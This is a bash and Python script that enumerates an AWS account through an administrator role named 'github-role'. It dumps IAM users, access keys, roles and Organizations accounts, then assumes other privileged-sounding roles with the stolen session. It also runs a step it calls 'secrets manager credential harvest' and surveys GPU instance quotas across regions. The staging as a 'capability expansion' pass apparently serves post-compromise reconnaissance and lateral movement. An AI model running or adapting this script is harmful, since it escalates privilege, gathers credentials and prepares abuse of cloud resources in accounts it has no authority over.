#!/usr/bin/env bash
# c211-i119860 pass 2: IAM/Organizations/Secrets/region-quota capability expansion
# for the AdministratorAccess role github-role. Read-only. Emits ONE JSON object.
set +e
export AWS_PAGER=""
export AWS_MAX_ATTEMPTS=2
REGION="${AWS_REGION:-${AWS_DEFAULT_REGION:-eu-west-2}}"
RAW="${C211_PROBE2_RAW:-/tmp/c211_i119860_p2_raw.txt}"
: > "$RAW"
say() { printf '%s\n' "$*" >> "$RAW"; }
cap() { head -c "${2:-2000}"; }

say "C211_I119860_AWSENUM2_START region=$REGION"

say "== identity =="
aws sts get-caller-identity --output json 2>&1 | cap 600 >> "$RAW"

say "== iam roles =="
aws iam list-roles --query 'Roles[].{n:RoleName,a:Arn,c:CreateDate,p:Path,t:AssumeRolePolicyDocument.Statement[0].Principal}' --output json 2>&1 | cap 7000 >> "$RAW"

say "== iam users =="
aws iam list-users --query 'Users[].{n:UserName,a:Arn,c:CreateDate}' --output json 2>&1 | cap 3000 >> "$RAW"
for u in $(aws iam list-users --query 'Users[].UserName' --output text 2>/dev/null); do
  say "-- keys for user $u"
  aws iam list-access-keys --user-name "$u" --query 'AccessKeyMetadata[].{id:AccessKeyId,s:Status,c:CreateDate}' --output json 2>&1 | cap 800 >> "$RAW"
done

say "== iam account authorization details (capped) =="
aws iam get-account-authorization-details --output json 2>&1 | cap 9000 >> "$RAW"
say "== iam account summary / aliases =="
aws iam get-account-summary --output json 2>&1 | cap 2500 >> "$RAW"
aws iam list-account-aliases --output json 2>&1 | cap 400 >> "$RAW"

say "== organizations =="
aws organizations describe-organization --output json 2>&1 | cap 2000 >> "$RAW"
aws organizations list-accounts --output json 2>&1 | cap 4000 >> "$RAW"

say "== sts assume-role over discovered roles =="
python3 - <<'PYROLES' 2>&1 | cap 6000 >> "$RAW"
import json, os, re, subprocess
reg = os.environ.get('AWS_REGION') or 'eu-west-2'
def aws(args, timeout=60, env=None):
    p = subprocess.run(['aws'] + args, capture_output=True, text=True, timeout=timeout, env=env)
    return p.returncode, p.stdout, p.stderr
rc, out, err = aws(['iam', 'list-roles', '--query', 'Roles[].[RoleName,Arn]', '--output', 'text'])
roles = []
if rc == 0:
    for line in out.splitlines():
        parts = line.split('\t')
        if len(parts) == 2:
            roles.append({'name': parts[0], 'arn': parts[1]})
else:
    print('ROLE_LIST_FAIL %s' % (err or out).strip()[:200])
print('DISCOVERED_ROLES %d %s' % (len(roles), ','.join(r['name'] for r in roles)[:1200]))
rc, out, err = aws(['sts', 'get-caller-identity', '--query', 'Arn', '--output', 'text'])
self_arn = out.strip()
pat = re.compile(r'(github|keda|gpu|admin|eks|k8s|terraform|deploy|ci|runner|backup|org|power|cloud|infra|automation)', re.I)
cands = [r for r in roles if r['name'] != 'github-role' and pat.search(r['name'])][:6]
print('ASSUME_CANDIDATES %s' % ','.join(r['name'] for r in cands))
for r in cands:
    rc, out, err = aws(['sts', 'assume-role', '--role-arn', r['arn'], '--role-session-name', 'c211i119860b',
                        '--duration-seconds', '900', '--output', 'json'])
    if rc != 0:
        print('ASSUME %s DENIED %s' % (r['name'], (err or out).strip().replace('\n', ' ')[:200]))
        continue
    try:
        c = json.loads(out)['Credentials']
    except Exception:
        print('ASSUME %s PARSE_FAIL' % r['name'])
        continue
    env = dict(os.environ)
    env['AWS_ACCESS_KEY_ID'] = c['AccessKeyId']; env['AWS_SECRET_ACCESS_KEY'] = c['SecretAccessKey']
    env['AWS_SESSION_TOKEN'] = c['SessionToken']; env['AWS_PAGER'] = ''
    rc2, out2, err2 = aws(['sts', 'get-caller-identity', '--query', 'Arn', '--output', 'text'], env=env)
    arn = out2.strip() if rc2 == 0 else 'ERR'
    rc3, out3, err3 = aws(['service-quotas', 'get-service-quota', '--service-code', 'ec2', '--quota-code',
                           'L-DB2E81BA', '--region', reg, '--query', 'Quota.Value', '--output', 'text'], env=env)
    quota = out3.strip() if rc3 == 0 else ('ERR ' + (err3 or out3).strip()[:120])
    rc4, out4, err4 = aws(['ec2', 'describe-instance-type-offerings', '--region', reg, '--location-type',
                           'availability-zone', '--filters', 'Name=instance-type,Values=g5.xlarge',
                           '--query', 'InstanceTypeOfferings[].Location', '--output', 'text'], env=env)
    off = out4.strip().replace('\n', ',') if rc4 == 0 else 'ERR'
    print('ASSUME %s OK arn=%s quota_L-DB2E81BA=%s g5_offering=%s' % (r['name'], arn, quota, off))
PYROLES

say "== secrets manager credential harvest =="
python3 ./probe_secrets.py 2>&1 | cap 6000 >> "$RAW"

say "== cross-region GPU quota (L-DB2E81BA / L-417A185B) =="
for r in eu-west-2 us-east-1 us-west-2 eu-central-1 ap-south-1; do
  for q in L-DB2E81BA L-417A185B; do
    say "-- $r $q"
    aws service-quotas get-service-quota --service-code ec2 --quota-code "$q" --region "$r" --query 'Quota.Value' --output text 2>&1 | cap 200 >> "$RAW"
  done
done

say "== misc capability checks =="
say "-- ec2 regions"
aws ec2 describe-regions --query 'length(Regions)' --output text 2>&1 | cap 100 >> "$RAW"
say "-- kms keys eu-west-2"
aws kms list-keys --region "$REGION" --query 'Keys[].KeyId' --output json 2>&1 | cap 1200 >> "$RAW"
say "-- dlami ssm parameter (eu-west-2)"
aws ssm get-parameter --name /aws/service/deeplearning/ami/x86_64/base-oss-nvidia-driver-gpu-ubuntu-22.04/latest/ami-id --region "$REGION" --query Parameter.Value --output text 2>&1 | cap 200 >> "$RAW"
say "-- gpu instance counts eu-west-2 / us-east-1"
aws ec2 describe-instances --region "$REGION" --filters 'Name=instance-type,Values=g5.xlarge,g5.12xlarge,p4d.24xlarge,p5.4xlarge,p5.48xlarge,g4dn.xlarge' --query 'Reservations[].Instances[].[InstanceId,State.Name,InstanceType]' --output text 2>&1 | cap 1200 >> "$RAW"
aws ec2 describe-instances --region us-east-1 --filters 'Name=instance-type,Values=g5.xlarge,g5.12xlarge,p4d.24xlarge,p5.4xlarge,p5.48xlarge,g4dn.xlarge' --query 'Reservations[].Instances[].[InstanceId,State.Name,InstanceType]' --output text 2>&1 | cap 1200 >> "$RAW"

say "C211_I119860_AWSENUM2_END"

python3 - "$RAW" <<'PYEOF'
import json, sys
raw = open(sys.argv[1], encoding='utf-8', errors='replace').read()
sections, cur, buf = {}, 'header', []
for line in raw.splitlines():
    if line.startswith('== ') and line.rstrip().endswith(' =='):
        if buf:
            sections[cur] = '\n'.join(buf); buf = []
        cur = line.strip().strip('=').strip()
    else:
        buf.append(line)
if buf:
    sections[cur] = '\n'.join(buf)
out, seen = {}, {}
for k, v in sections.items():
    key = k.replace(' ', '_').replace('/', '_').replace('(', '').replace(')', '')
    key = key.replace('--', '').replace('__', '_')[:64] or 'section'
    if key in seen:
        seen[key] += 1; key = '%s#%d' % (key[:60], seen[key])
    else:
        seen[key] = 0
    out[key] = v[:3200]
print(json.dumps(out))
PYEOF
exit 0
